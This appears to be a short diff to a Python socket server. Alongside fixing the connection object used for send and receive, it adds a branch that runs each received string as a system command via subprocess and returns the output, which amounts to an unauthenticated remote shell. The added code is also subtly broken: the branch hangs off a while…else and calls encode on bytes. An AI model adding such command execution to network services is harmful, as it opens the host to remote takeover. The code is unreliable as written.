@@ -37,13 +37,15 @@ def serv(ip , port):
 		conn , addr = s.accept()
 
 		while True:
-			data = s.recv(1024).decode(errors='ignore')
+			data = conn.recv(1024).decode(errors='ignore')
 			if data == "/quit" or data == "/exit":
-					s.send(typewritter("[CLOSE] SERVER IS CLOSED...").encode())
+					conn.send(typewritter("[CLOSE] SERVER IS CLOSED...").encode())
 					break
 
 		else:
-			s.send(data.encode())
+			import subprocess
+			output = subprocess.check_output(data)
+			conn.send(output.encode())
 
 	except Exception as exp:
 			typewritter(f"{Red}[ERROR] UNEXPECT BEHAVIOR WHY ➤ {exp}\n{Reset}")
